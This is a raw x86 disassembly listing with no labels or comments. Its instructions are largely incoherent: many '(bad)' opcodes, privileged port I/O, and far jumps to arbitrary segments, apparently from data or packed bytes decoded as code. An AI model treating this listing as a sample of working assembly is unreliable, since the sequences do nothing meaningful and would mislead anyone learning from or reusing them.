  41617b:	aam    0xe5
  41617d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41617e:	inc    eax
  41617f:	or     eax,DWORD PTR [ebx*1+0x1389064f]
  416186:	aam    0x19
  416188:	or     eax,0xa96b1aa8
  41618d:	ins    DWORD PTR es:[edi],dx
  41618e:	aad    0xf6
  416190:	or     DWORD PTR [esi+edi*8+0x6f27fa8f],0x31
  416198:	xor    bl,BYTE PTR [edx+0x4b]
  41619b:	sbb    BYTE PTR [ecx+0x62871a63],cl
  4161a1:	push   esi
  4161a2:	adc    al,0x18
  4161a4:	and    ebx,edi
  4161a6:	and    eax,0x277f3488
  4161ab:	add    ah,BYTE PTR fs:[edi+0x11521327]
  4161b2:	ja     0x416179
  4161b4:	ins    BYTE PTR es:[edi],dx
  4161b5:	loopne 0x41622c
  4161b7:	in     eax,0xc5
  4161b9:	or     al,0xbd
  4161bb:	jne    0x416234
  4161bd:	cmp    eax,DWORD PTR [eax]
  4161bf:	repz dec edi
  4161c1:	add    cl,cl
  4161c3:	jecxz  0x416176
  4161c5:	and    eax,0x941b47ad
  4161ca:	fs push es
  4161cc:	and    BYTE PTR [edi+0x67c29948],ch
  4161d2:	mov    esp,0xaea314c8
  4161d7:	mov    ch,0x4e
  4161d9:	and    dl,BYTE PTR [esi+0x1]
  4161dc:	xchg   ecx,eax
  4161dd:	outs   dx,BYTE PTR ds:[esi]
  4161de:	mov    dh,0xc0
  4161e0:	out    0x8c,al
  4161e2:	xor    eax,0xbb4477f7
  4161e7:	cs push ss
  4161e9:	jae    0x416208
  4161eb:	and    eax,0xfac9c616
  4161f0:	push   ecx
  4161f1:	mov    ebx,0x7553156e
  4161f6:	fsubr  DWORD PTR [edi]
  4161f8:	dec    edx
  4161f9:	test   cl,al
  4161fb:	push   eax
  4161fc:	xor    eax,0x8360e2dc
  416201:	lds    edx,FWORD PTR [eax]
  416203:	or     BYTE PTR [esi],cl
  416205:	cmp    ch,BYTE PTR [esp-0x1dd0cf45]
  41620c:	add    eax,0x544c1c17
  416211:	std    
  416212:	shl    BYTE PTR [ebp+0x79],cl
  416215:	dec    esi
  416216:	sbb    BYTE PTR [edi+esi*1-0x9],dh
  41621a:	out    0x26,eax
  41621c:	jmp    0xe769:0xb4ca0e22
  416223:	mul    BYTE PTR [esp+eiz*4]
  416226:	push   0x672fcce2
  41622b:	or     al,0xc
  41622d:	push   ebp
  41622e:	cmp    eax,0x10b3c48c
  416233:	loope  0x41621e
  416235:	sub    al,0xc0
  416237:	js     0x416225
  416239:	mov    ebx,0xb949d891
  41623e:	fist   WORD PTR [ebp-0x36]
  416241:	je     0x41628b
  416243:	call   FWORD PTR [ebx+edx*8]
  416246:	mov    ds:0xa2b7c687,eax
  41624b:	jb     0x4162a7
  41624d:	xor    ch,BYTE PTR [ecx]
  41624f:	ins    BYTE PTR es:[edi],dx
  416250:	jns    0x4161da
  416252:	or     edx,eax
  416254:	leave  
  416255:	push   ss
  416256:	jmp    0x7700:0xbafff383
  41625d:	in     al,0xaa
  41625f:	mov    al,0xac
  416261:	inc    esi
  416262:	repz mov dl,0x23
  416265:	xor    BYTE PTR [esi],0xdd
  416268:	fcom   QWORD PTR [ecx-0x6]
  41626b:	pop    edi
  41626c:	xchg   ebp,eax
  41626d:	scas   al,BYTE PTR es:[edi]
  41626e:	or     eax,0x94adc028
  416273:	mov    al,ds:0x9e13a1d8
  416278:	pop    edi
  416279:	mov    ebx,DWORD PTR [eax]
  41627b:	pop    edx
  41627c:	or     esp,esi
  41627e:	std    
  41627f:	lea    ebx,[edi-0x3b]
  416282:	jbe    0x416291
  416284:	fldcw  WORD PTR [edi-0x45ba7567]
  41628a:	pusha  
  41628b:	rcl    DWORD PTR [ecx],0x2e
  41628e:	rcl    edi,cl
  416290:	adc    dl,cl
  416292:	xchg   edx,eax
  416293:	add    ch,bl
  416295:	mov    bl,0x9b
  416297:	std    
  416298:	xchg   esi,eax
  416299:	arpl   WORD PTR ds:0x62c00cc,sp
  41629f:	mov    dl,BYTE PTR [edi+0x43]
  4162a2:	outs   dx,BYTE PTR ds:[esi]
  4162a3:	and    edi,edx
  4162a5:	retf   0x98ee
  4162a8:	push   esp
  4162a9:	arpl   bx,di
  4162ab:	es les ebp,FWORD PTR cs:[ebx]
  4162af:	cmp    BYTE PTR [ebx-0x16],0xe7
  4162b3:	jg     0x416244
  4162b5:	xchg   BYTE PTR [ebx+0x5d],dl
  4162b8:	ins    BYTE PTR es:[edi],dx
  4162b9:	ficomp WORD PTR [edi-0x2e]
  4162bc:	ror    BYTE PTR [edx-0x30],0x64
  4162c0:	push   0xea81a828
  4162c5:	cmp    BYTE PTR [eax+0x59],cl
  4162c8:	ja     0x4162bc
  4162ca:	imul   eax,DWORD PTR [ebx],0xffffffa1
  4162cd:	repz arpl WORD PTR [esi],si
  4162d0:	(bad)  
  4162d1:	mov    esi,0xca8833ca
  4162d6:	(bad)  
  4162d7:	mov    bl,0xb2
  4162d9:	daa    
  4162da:	test   al,0xe
  4162dc:	xor    BYTE PTR [esi-0x7f],ch
  4162df:	sahf   
  4162e0:	fsub   DWORD PTR [esi+0x31b61e61]
  4162e6:	cdq    
  4162e7:	jb     0x41634e
  4162e9:	push   esi
  4162ea:	rcr    BYTE PTR [ecx],1
  4162ec:	popf   
  4162ed:	dec    esi
  4162ee:	call   0xe981:0x34f5771c
  4162f5:	retf   
  4162f6:	pop    ss
  4162f7:	sbb    dl,cl
  4162f9:	cli    
  4162fa:	mov    eax,0xbb5c2f7c
  4162ff:	popf   
  416300:	xor    eax,DWORD PTR [edi-0x7d]
  416303:	ins    DWORD PTR es:[edi],dx
  416304:	xchg   BYTE PTR [eax+ecx*2+0xb],al
  416308:	sbb    dl,BYTE PTR [esi+ecx*4+0x21]
  41630c:	fs mov dh,0xc1
  41630f:	push   ss
  416310:	cli    
  416311:	(bad)  
  416312:	jns    0x41631b
  416314:	(bad)  
  416316:	dec    esi
  416317:	idiv   BYTE PTR [edx+ebx*2+0x5d]
  41631b:	loope  0x4162a8
  41631d:	in     al,dx
  41631e:	aam    0xb3
  416320:	mov    eax,ds:0x9ab77bbf
  416325:	cmc    
  416326:	sbb    ah,BYTE PTR [edi]
  416328:	cmp    edx,DWORD PTR [ecx-0x58ad9f87]
  41632e:	jl     0x416378
  416330:	mov    dh,dh
  416332:	push   ecx
  416333:	rol    BYTE PTR [ebx],0x61
  416336:	stos   BYTE PTR es:[edi],al
  416337:	ds (bad) 
  41633a:	dec    ecx
  41633b:	add    BYTE PTR [ebx],bh
  41633d:	mov    dh,0xf
  41633f:	ss push ss
  416341:	dec    ecx
  416342:	fild   WORD PTR [ebx-0x46c3268a]
  416348:	push   ebp
  416349:	in     eax,0x10
  41634b:	aad    0xf1
  41634d:	out    0x87,eax
  41634f:	imul   eax,ebp,0xf69be9b2
  416355:	mov    ah,0x1a
  416357:	out    dx,eax
  416358:	mov    ebx,0x5805509f
  41635d:	push   ss
  41635e:	push   es
  41635f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416360:	das    
  416361:	enter  0xf8e9,0x71
  416365:	jmp    0x41630b
  416367:	fst    QWORD PTR [edi]
  416369:	fnstenv [edi+0x1a8b7074]
  41636f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416370:	pop    es
  416371:	fcmovb st,st(6)
  416373:	imul   ebx,DWORD PTR [edx+0x1f87669c],0x94fdfb6
  41637d:	pop    ss
  41637e:	push   esp
  41637f:	jmp    0xfd1b:0xa96db99b
  416386:	addr16 clc 
  416388:	into   
  416389:	aaa    
  41638a:	shr    DWORD PTR [esi+0xd],cl
  41638d:	cwde   
  41638e:	or     eax,0x49698dd4
  416393:	inc    eax
  416394:	mov    ch,0x4
  416396:	dec    ecx
  416397:	add    al,0x9
  416399:	add    eax,0x4f0641c2
  41639e:	mov    ds:0xe33ff36f,al
  4163a3:	fstp   TBYTE PTR [edx]
  4163a5:	push   edi
  4163a6:	mov    dh,0x40
  4163a8:	lds    ebp,FWORD PTR [ebp+0xb743d9d]
  4163ae:	mov    dl,0x4d
  4163b0:	(bad)  
  4163b2:	ficom  DWORD PTR [esi-0x116b0cff]
  4163b8:	push   eax
  4163b9:	fsub   QWORD PTR [edi]
  4163bb:	sbb    bh,BYTE PTR [esp+edi*4-0x22]
  4163bf:	pop    ecx
  4163c0:	and    al,0x54
  4163c2:	mov    DWORD PTR [edi],0x834a88e1
  4163c8:	addr16 push edi
  4163ca:	pop    ecx
  4163cb:	xchg   ebx,eax
  4163cc:	imul   edx,DWORD PTR [esi+0x50d91975],0xffffffbb
  4163d3:	in     eax,0x27
  4163d5:	sbb    eax,0x25028130
  4163da:	loope  0x416375
  4163dc:	call   ebx
  4163de:	int3   
  4163df:	ja     0x41641c
  4163e1:	jge    0x416455
  4163e3:	test   eax,0x13db09e5
  4163e8:	in     al,dx
  4163e9:	push   esp
  4163ea:	aam    0xdd
  4163ec:	inc    edi
  4163ed:	inc    edi
  4163ee:	imul   esp,DWORD PTR [ecx-0x42],0x919a161d
  4163f5:	adc    bl,ah
  4163f7:	pop    ebp
  4163f8:	dec    edi
  4163f9:	outs   dx,BYTE PTR ds:[esi]
  4163fa:	out    dx,al
  4163fb:	add    al,0x65
  4163fd:	or     DWORD PTR [ebp-0x79c2b3b7],0x2a8c32a
  416407:	ins    BYTE PTR es:[edi],dx
  416408:	fdivrp st(6),st
  41640a:	bound  ebx,QWORD PTR [edi-0x20a2a1fa]
  416410:	jnp    0x4163f5
  416412:	int    0xb4
  416414:	lock stos DWORD PTR es:[edi],eax
  416416:	add    eax,0xca3a698a
  41641b:	xor    bh,BYTE PTR [ecx-0x31]
  41641e:	cmp    esi,0x9747200d
  416424:	scas   eax,DWORD PTR es:[edi]
  416425:	xchg   esi,eax
  416426:	call   0x2441e846
  41642b:	pop    edx
  41642c:	sbb    edi,DWORD PTR [edx+0x1]
  41642f:	and    BYTE PTR [edi-0x4a],0xc2
  416433:	jp     0x416464
  416435:	or     eax,0x423832b7
  41643a:	sti    
  41643b:	fsubr  st,st(2)
  41643d:	test   eax,ecx
  41643f:	fcomp  st(7)
  416441:	test   al,0x6f
  416443:	cmp    bh,BYTE PTR [ebx+0x58]
  416446:	cmp    ebx,DWORD PTR [esi+edx*4-0x1a9ba3f3]
  41644d:	jecxz  0x416421
  41644f:	outs   dx,DWORD PTR ds:[esi]
  416450:	push   es
  416451:	or     edi,ebx
  416453:	cmp    cl,BYTE PTR gs:[edi-0x3a]
  416457:	js     0x41647b
  416459:	out    dx,eax
  41645a:	ds sub al,ch
  41645d:	mov    DWORD PTR [eax],0x58ca7491
  416463:	mov    ebp,DWORD PTR [ebx-0x4827c8bf]
  416469:	outs   dx,DWORD PTR ds:[esi]
  41646a:	in     eax,dx
  41646b:	lahf   
  41646c:	stos   BYTE PTR es:[edi],al
  41646d:	aad    0x14
  41646f:	cli    
  416470:	(bad)  
  416471:	push   ebx
  416472:	sbb    al,BYTE PTR [esi]
  416474:	call   0xf696a8eb
  416479:	(bad)  
  41647a:	cs js  0x4164d7
  41647d:	xor    al,0xa4
  41647f:	jmp    0x416427
  416481:	xchg   edi,edx
  416483:	les    ecx,FWORD PTR [ebx+0x27]
  416486:	out    0x26,eax
  416488:	test   eax,0x2c528abc
  41648d:	ja     0x416475
  41648f:	inc    edi
  416490:	nop
  416491:	ins    BYTE PTR es:[edi],dx
  416492:	popa   
  416493:	mov    eax,0x2672122a
  416498:	inc    esi
  416499:	pop    ss
  41649a:	stc    
  41649b:	imul   eax,DWORD PTR [edx+edx*4-0x66ee3350],0xffffffd5
  4164a3:	push   es
  4164a4:	pop    ds
  4164a5:	xor    al,0xb
  4164a7:	push   ds
  4164a8:	mov    ebp,0xa00cf4e
  4164ad:	add    bh,al
  4164af:	and    esi,DWORD PTR [ebx]
  4164b1:	inc    esp
  4164b2:	jb     0x41643b
  4164b4:	push   edx
  4164b5:	cmc    
  4164b6:	and    DWORD PTR [edx-0x796202a0],edx
  4164bc:	or     BYTE PTR [esi+0x64],bl
  4164bf:	mov    ebp,0xaf80402f
  4164c4:	iret   
  4164c5:	cli    
  4164c6:	daa    
  4164c7:	push   ds
  4164c8:	sbb    al,0xc3
  4164ca:	mov    ah,0x5c
  4164cc:	das    
  4164cd:	mov    bh,0xcf
  4164cf:	mov    ecx,0xd09ef968
  4164d4:	jno    0x41650d
  4164d6:	shr    BYTE PTR [esi-0x14],1
  4164d9:	sar    BYTE PTR [ebx],1
  4164db:	pop    edi
  4164dc:	addr16 cmp eax,0xdae59dea
  4164e2:	popf   
  4164e3:	adc    DWORD PTR [ebx-0x782ffca4],edx
  4164e9:	fwait
  4164ea:	sbb    eax,0x57ddae09
  4164ef:	dec    ebx
  4164f0:	push   0xffffffb1
  4164f2:	jmp    0x4e0f:0x246eb792
  4164f9:	pop    esi
  4164fa:	push   esi
  4164fb:	inc    ebx
  4164fc:	in     eax,0xb5
  4164fe:	sub    BYTE PTR [edi],dh
  416500:	push   esp
  416501:	pusha  
  416502:	aad    0x4f
  416504:	xor    ebp,DWORD PTR [ebx]
  416506:	xchg   edx,eax
  416507:	mov    bl,BYTE PTR [ebx+edx*2]
  41650a:	adc    esp,DWORD PTR [ecx]
  41650c:	push   edi
  41650d:	or     esi,DWORD PTR [ebx]
  41650f:	iret   
  416510:	add    BYTE PTR [ebp-0x5e8c4355],ah
  416516:	loopne 0x416575
  416518:	jne    0x4164a0
  41651a:	sub    esi,DWORD PTR [ebx+0xc]
  41651d:	xlat   BYTE PTR gs:[ebx]
  41651f:	fistp  DWORD PTR ds:0x1028bc7d
  416525:	mov    dl,0x88
  416527:	and    ebp,DWORD PTR [ebx]
  416529:	in     al,dx
  41652a:	jmp    0x652e:0x6bff1791
  416531:	push   0xfb19314
  416536:	stos   DWORD PTR es:[edi],eax
  416537:	icebp  
  416538:	xor    ebx,ebp
  41653a:	inc    ebp
  41653b:	into   
  41653c:	push   ebx
  41653d:	mov    esp,0x6575a7db
  416542:	xchg   esi,eax
  416543:	in     al,dx
  416544:	jg     0x416526
  416546:	xor    al,0x53
  416548:	inc    ecx
  416549:	es mov ebx,0x7fea4f07
  41654f:	popa   
  416550:	sbb    eax,0xd8bec8cf
  416555:	sub    edi,ecx
  416557:	add    DWORD PTR [ecx],ebp
  416559:	and    DWORD PTR [ebp-0x4bc8055d],esi
  41655f:	xor    ebx,DWORD PTR [edx+0x6c]
  416562:	outs   dx,BYTE PTR ds:[esi]
  416563:	test   al,0xab
  416565:	inc    eax
  416566:	mov    ch,0xac
  416568:	iret   
  416569:	and    ah,BYTE PTR [esi-0xa]
  41656c:	adc    al,BYTE PTR [edx+0x5a]
  41656f:	sbb    ah,BYTE PTR [ebp-0x1e]
  416572:	rol    DWORD PTR [esi+0x48d7f623],cl
  416578:	(bad)  
  41657b:	pop    es
  41657c:	arpl   si,sp
  41657e:	mov    edi,0xeababfbd
  416583:	ret    
  416584:	lahf   
  416585:	xchg   ebp,eax
  416586:	mov    dh,0xc9
  416588:	mov    bh,0xef
  41658a:	popf   
  41658b:	dec    edx
  41658c:	clc    
  41658d:	xor    DWORD PTR [edx+0x43],0xbccb843e
  416594:	dec    ecx
  416595:	and    ebp,edi
  416597:	aam    0x7e
  416599:	out    dx,al
  41659a:	dec    edx
  41659b:	cdq    
  41659c:	icebp  
  41659d:	sbb    DWORD PTR [ecx+0x3fad9541],0x1b0b67b2
  4165a7:	scas   eax,DWORD PTR es:[edi]
  4165a8:	or     ebx,esp
  4165aa:	js     0x4165f8
  4165ac:	jns    0x41652e
  4165ae:	scas   eax,DWORD PTR es:[edi]
  4165af:	scas   al,BYTE PTR es:[edi]
  4165b0:	inc    esp
  4165b1:	mov    al,BYTE PTR [ebx+0x40]
  4165b4:	addr16 pop esi
  4165b6:	dec    ebp
  4165b7:	add    BYTE PTR [eax+0x14],bh
  4165ba:	dec    esp
  4165bb:	jg     0x4165b5
  4165bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165be:	and    ebp,DWORD PTR [ebx+esi*8+0x35]
  4165c2:	lahf   
  4165c3:	pop    ebx
  4165c4:	lods   al,BYTE PTR ds:[esi]
  4165c5:	ret    
  4165c6:	scas   al,BYTE PTR es:[edi]
  4165c7:	pusha  
  4165c8:	imul   ecx,DWORD PTR [ebx],0xffffffe2
  4165cb:	data16 xlat BYTE PTR ds:[ebx]
  4165cd:	(bad)  
  4165cf:	and    al,0x1
  4165d1:	sub    al,0x1f
  4165d3:	loope  0x4165a2
  4165d5:	mov    ecx,0xcb96bca5
  4165da:	iret   
  4165db:	stos   BYTE PTR es:[edi],al
  4165dc:	aaa    
  4165dd:	dec    ebp
  4165de:	mov    WORD PTR [edx+0x59176b8b],?
  4165e4:	mov    DWORD PTR [ebx],ebp
  4165e6:	stc    
  4165e7:	mov    ebx,0x7384bd8d
  4165ec:	enter  0x6430,0xba
  4165f0:	mov    esi,edx
  4165f2:	xchg   ebp,eax
  4165f3:	and    BYTE PTR [ebp-0x16],0xe8
  4165f7:	sbb    al,0x3b
  4165f9:	lods   al,BYTE PTR ds:[esi]
  4165fa:	jp     0x4165cb
  4165fc:	mov    ebp,0xa3e0e277
  416601:	push   ebp
  416602:	xchg   esi,eax
  416603:	dec    ebp
  416604:	jl     0x416662
  416606:	xchg   esp,edx
  416608:	nop
  416609:	sub    dl,BYTE PTR ds:0xd7f48e3b
  41660f:	les    ecx,FWORD PTR [ecx+0x11]
  416612:	int3   
  416613:	xchg   ecx,eax
  416614:	cmp    al,0xc0
  416616:	add    al,0x31
  416618:	retf   
  416619:	inc    edi
  41661a:	iret   
  41661b:	and    al,0x50
  41661d:	sub    dl,ah
  41661f:	mov    edi,0xa15a0930
  416624:	addr16 push ss
  416626:	or     BYTE PTR [esi-0x10],0x6a
  41662a:	out    dx,eax
  41662b:	adc    ecx,DWORD PTR [esi+0x39]
  41662e:	mov    edi,0xff902726
  416633:	mov    ah,0x85
  416635:	aam    0x1d
  416637:	mov    cl,0x5c
  416639:	rcr    ecx,1
  41663b:	sbb    DWORD PTR [esi],ebp
  41663d:	lock rol BYTE PTR [ecx-0x21],1
  416641:	mov    bh,BYTE PTR [edx-0xaf8c789]
  416647:	mov    eax,ds:0x42eb2f06
  41664c:	sbb    eax,DWORD PTR [ecx-0x53]
  41664f:	push   ecx
  416650:	jnp    0x4165e1
  416652:	dec    ebp
  416653:	rol    BYTE PTR [edi*1-0x3236e52f],1
  41665a:	loop   0x4166d9
  41665c:	push   ecx
  41665d:	mov    dh,0xc1
  41665f:	mov    dl,0x77
  416661:	cmp    ch,dl
  416663:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416664:	inc    ebp
  416665:	mov    bl,0x2a
  416667:	pop    es
  416668:	dec    esp
  416669:	daa    
  41666a:	neg    BYTE PTR [ecx]
  41666c:	pop    ebx
  41666d:	mov    cl,BYTE PTR [ebp-0x36]
  416670:	repnz or eax,0xa5977861
  416676:	or     BYTE PTR [eax+0x2d4434ad],dl
  41667c:	push   eax
  41667d:	jmp    0xc2427560
  416682:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416683:	cwde   
  416684:	ret    0x87e5
  416687:	pop    DWORD PTR [esi]
  416689:	icebp  
  41668a:	arpl   WORD PTR [esi+0x3f],si
  41668d:	sti    
  41668e:	cmp    eax,0x9f02d422
  416693:	inc    edi
  416694:	lods   al,BYTE PTR ds:[esi]
  416695:	push   ss
  416696:	and    BYTE PTR ds:0x85bee762,ch
  41669c:	mov    eax,ds:0xdcc4ff5a
  4166a1:	ret    
  4166a2:	pop    ss
  4166a3:	hlt    
  4166a4:	xor    BYTE PTR [eax+0x3],cl
  4166a7:	dec    ebp
  4166a8:	fimul  WORD PTR [edx+0x3f]
  4166ab:	outs   dx,BYTE PTR ds:[esi]
  4166ac:	pop    ebp
  4166ad:	retf   0x41b6
  4166b0:	xchg   ebx,eax
  4166b1:	pop    ecx
  4166b2:	in     al,dx
  4166b3:	sub    eax,esi
  4166b5:	ret    
  4166b6:	mov    ch,0x7f
  4166b8:	test   DWORD PTR [ecx+0x38bb720e],eax
  4166be:	xchg   ebx,eax
  4166bf:	dec    esp
  4166c0:	leave  
  4166c1:	clc    
  4166c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166c3:	xor    edx,DWORD PTR [edx-0x42]
  4166c6:	cmp    BYTE PTR [edx+0x52],0xfe
  4166ca:	dec    esi
  4166cb:	popf   
  4166cc:	sub    DWORD PTR [ecx],0x3a
  4166cf:	cmp    al,0x23
  4166d1:	xchg   BYTE PTR [esi-0x2],al
  4166d4:	iret   
  4166d5:	neg    BYTE PTR [ecx]
  4166d7:	sahf   
  4166d8:	xchg   edi,eax
  4166d9:	xor    BYTE PTR [eax],0x9b
  4166dc:	jbe    0x4166f7
  4166de:	inc    esp
  4166df:	pop    ss
  4166e0:	das    
  4166e1:	add    al,0xa4
  4166e3:	pop    ebx
  4166e4:	and    eax,0x6dd7181a
  4166e9:	push   ds
  4166ea:	fimul  DWORD PTR [ecx]
  4166ec:	in     eax,0xd3
  4166ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166ef:	mov    ds:0x5c8fbec4,eax
  4166f4:	not    BYTE PTR [eax+edi*4-0x6817d046]
  4166fb:	jbe    0x416720
  4166fd:	jl     0x41675f
  4166ff:	call   0x8036:0xb2c1bc06
  416706:	pop    es
  416707:	stos   BYTE PTR es:[edi],al
  416708:	retf   0x9806
  41670b:	sbb    eax,0x74054352
  416710:	jge    0x416706
  416712:	mov    bl,0x94
  416714:	mov    bl,0x56
  416716:	mov    edx,0x24e11dff
  41671b:	add    bh,ch
  41671d:	call   0x11a4a29f
  416722:	iret   
  416723:	icebp  
  416724:	xor    ch,al
  416726:	outs   dx,BYTE PTR ds:[esi]
  416727:	xchg   ebp,eax
  416728:	push   ecx
  416729:	sub    ebx,0x62
  41672c:	(bad)  
  41672d:	test   eax,0xe9125fb7
  416732:	test   ecx,0xf663b91e
  416738:	pop    ss
  416739:	mul    BYTE PTR [ecx-0x2f6a73eb]
  41673f:	and    eax,esi
  416741:	lods   eax,DWORD PTR ds:[esi]
  416742:	push   ecx
  416743:	mov    cs,WORD PTR [esi+esi*2-0x75]
  416747:	xchg   ebx,eax
  416748:	mov    edi,0xfcc44212
  41674d:	not    BYTE PTR [edx+0x14a50774]
  416753:	shl    BYTE PTR [esi],0x4e
  416756:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416757:	sti    
  416758:	jle    0x41670a
  41675a:	es mov edx,0xdea7086
  416760:	arpl   WORD PTR [esi-0x7b70a84b],dx
  416766:	stc    
  416767:	pop    edi
  416768:	push   ss
  416769:	test   eax,0x2f6d6d1c
  41676e:	int    0xcd
  416770:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416771:	cmp    al,0x88
  416774:	mov    ds:0x4a588426,al
  416779:	cmp    eax,0xf436a803
  41677e:	out    dx,eax
  41677f:	pop    es
  416780:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416781:	mov    cs,WORD PTR ds:0xea378a26
  416787:	jmp    0xcb7d:0x890749a2
  41678e:	aad    0xcd
  416790:	pop    ebx
  416791:	add    ebp,0x129e846f
  416797:	mov    eax,0x3132832d
  41679c:	mov    eax,ds:0x2a8683e3
  4167a1:	add    eax,0x76cff0bc
  4167a6:	dec    DWORD PTR ds:[ebx+0x5a]
  4167aa:	pop    ds
  4167ab:	retf   
  4167ac:	and    eax,0x1edc7970
  4167b1:	jmp    0x3673:0x15aa733b
  4167b8:	xchg   ebp,eax
  4167b9:	ffree  st(5)
  4167bb:	fild   QWORD PTR [eax+edi*1-0x1]
  4167bf:	(bad)  
  4167c0:	jns    0x416793
  4167c2:	mov    DWORD PTR [ecx],esp
  4167c4:	mov    ecx,edi
  4167c6:	inc    eax
  4167c7:	sbb    eax,0x1308e801
  4167cc:	mov    esp,0x172443d8
  4167d1:	daa    
  4167d2:	push   edi
  4167d3:	sub    DWORD PTR [ebp+0x5838b983],esp
  4167d9:	pusha  
  4167da:	cmp    DWORD PTR ds:0x716d8ce7,0xd60410de
  4167e4:	mov    cl,0x4b
  4167e6:	test   al,0x64
  4167e8:	idiv   BYTE PTR fs:[edx-0x3b]
  4167ec:	xchg   edx,eax
  4167ed:	jp     0x416783
  4167ef:	popa   
  4167f0:	or     BYTE PTR [eax+0x1c42b572],al
  4167f6:	test   DWORD PTR [ebp-0x5f],edi
  4167f9:	sti    
  4167fa:	aas    
  4167fb:	xor    ah,dh
  4167fd:	jbe    0x4167d5
  4167ff:	sbb    DWORD PTR [ebx+0x759e5ad2],ebx
  416805:	lock add BYTE PTR [ecx],cl
  416808:	nop
  416809:	scas   eax,DWORD PTR es:[edi]
  41680a:	mov    fs,WORD PTR ds:0x901799bf
  416810:	cdq    
  416811:	jecxz  0x41681e
  416813:	inc    ecx
  416814:	ret    
  416815:	and    BYTE PTR [esi+0x3b06ebef],dl
  41681b:	jnp    0x4167ab
  41681d:	sbb    al,0x55
  41681f:	imul   ebp,DWORD PTR [ebx+0x5255487a],0xffffffd8
  416826:	xor    BYTE PTR [ebx],dl
  416828:	stos   BYTE PTR es:[edi],al
  416829:	push   es
  41682a:	sbb    BYTE PTR [esp+ebx*8],dl
  41682d:	adc    al,0xdf
  41682f:	pop    edi
  416830:	loope  0x41683d
  416832:	(bad)  
  416833:	sbb    al,0xf1
  416835:	sub    BYTE PTR [ecx+eiz*1],cl
  416838:	ins    DWORD PTR es:[edi],dx
  416839:	push   ebp
  41683a:	pop    ds
  41683b:	mov    bl,0x31
  41683d:	adc    dh,BYTE PTR [eax-0x7a]
  416840:	xor    al,0xf6
  416842:	dec    esi
  416843:	sub    edi,eax
  416845:	in     eax,dx
  416846:	xchg   edx,eax
  416847:	jle    0x41681c
  416849:	std    
  41684a:	push   edx
  41684b:	inc    edx
  41684c:	xchg   BYTE PTR [eax+edi*1+0x4fd5568e],bl
  416853:	(bad)  
  416854:	lock push eax
  416856:	mov    esp,0x5ed40963
  41685b:	jmp    0xfc81:0xff87efde
  416862:	je     0x4167fe
  416864:	mov    esi,0x2cb1f44c
  416869:	push   cs
  41686a:	dec    eax
  41686b:	fld    TBYTE PTR [ecx+0x3]
  41686e:	test   DWORD PTR [eax],edi
  416870:	mov    ds:0xd8885310,al
  416875:	dec    ecx
  416876:	aam    0x53
  416878:	push   ss
  416879:	sti    
  41687a:	cmp    al,0x3e
  41687c:	dec    ebp
  41687d:	popf   
  41687e:	(bad)  
  416880:	sbb    BYTE PTR [ebx],ch
  416882:	fadd   st,st(7)
  416884:	mov    dl,0xe1
  416886:	cdq    
  416887:	sub    BYTE PTR [edi],cl
  416889:	jle    0x4168a4
  41688b:	pop    esp
  41688c:	je     0x41687c
  41688e:	or     ebp,DWORD PTR [esi+0x1a975a8]
  416894:	dec    edx
  416895:	call   0x2e4a:0x9d2739a0
  41689c:	add    eax,0x8ef7049
  4168a1:	adc    eax,0xbcdb4a3
  4168a6:	mov    ebp,0x778c7cc2
  4168ab:	dec    ebp
  4168ac:	jne    0x41689b
  4168ae:	stos   DWORD PTR es:[edi],eax
  4168af:	adc    al,0x8d
  4168b1:	cmp    dl,BYTE PTR [ecx+0x10]
  4168b4:	imul   edi,DWORD PTR [edx],0x668d2e5f
  4168ba:	fadd   DWORD PTR [ebx]
  4168bc:	je     0x4168ff
  4168be:	popa   
  4168bf:	inc    ecx
  4168c0:	xor    BYTE PTR [esi+edi*2-0x22],bl
  4168c4:	dec    edi
  4168c5:	es xor al,0x9d
  4168c8:	int    0xa
  4168ca:	mov    esp,0xa9429a7
  4168cf:	in     eax,0xaf
  4168d1:	sub    eax,0xdda1e5f6
  4168d6:	ds xor al,0xeb
  4168d9:	call   0xa64:0x1a45d34
  4168e0:	mov    edi,0xd37e0598
  4168e5:	jbe    0x4168ab
  4168e7:	outs   dx,BYTE PTR ds:[esi]
  4168e8:	mov    al,ds:0xcdb6fdde
  4168ed:	sbb    al,0x67
  4168ef:	fistp  QWORD PTR [ebx+edx*8-0x31]
  4168f3:	mov    BYTE PTR [edx+0x55],0x73
  4168f7:	mov    ecx,0x8b3674c7
  4168fc:	pop    ebx
  4168fd:	lods   al,BYTE PTR ds:[esi]
  4168fe:	sbb    DWORD PTR [esi],ebx
  416900:	ins    BYTE PTR es:[edi],dx
  416901:	mov    gs,ebp
  416903:	rcr    dl,1
  416905:	add    ah,BYTE PTR [ecx-0x65]
  416908:	retf   0xfba7
  41690b:	mov    BYTE PTR [ebp+0x55],cl
  41690e:	(bad)
  416913:	push   0x37466b35
  416918:	stos   BYTE PTR es:[edi],al
  416919:	ficom  WORD PTR [esi-0x2]
  41691c:	shl    BYTE PTR [eax-0x6f],1
  41691f:	sub    BYTE PTR [ecx+0x533a69f8],dl
  416925:	inc    edx
  416926:	jge    0x4168f3
  416928:	mov    ah,0x84
  41692a:	dec    eax
  41692b:	jae    0x4168d3
  41692d:	fld    TBYTE PTR [ecx+0x3a]
  416930:	mov    dh,0x2
  416932:	aam    0x3c
  416934:	mov    cs:0x3bd2c30b,al
  41693a:	mov    al,ds:0x86823096
  41693f:	cli    
  416940:	(bad)  
  416942:	and    BYTE PTR [ecx-0x4aa61de5],ah
  416948:	dec    edx
  416949:	push   ebp
  41694a:	add    eax,0xcd8a638a
  41694f:	cmp    al,0xb0
  416951:	ret    
  416952:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416953:	xor    eax,0xe3558568
  416958:	pop    ebp
  416959:	aas    
  41695a:	push   ss
  41695b:	sbb    bh,dl
  41695d:	push   ss
  41695e:	std    
  41695f:	mov    al,0x7d
  416961:	pop    eax
  416962:	and    eax,ecx
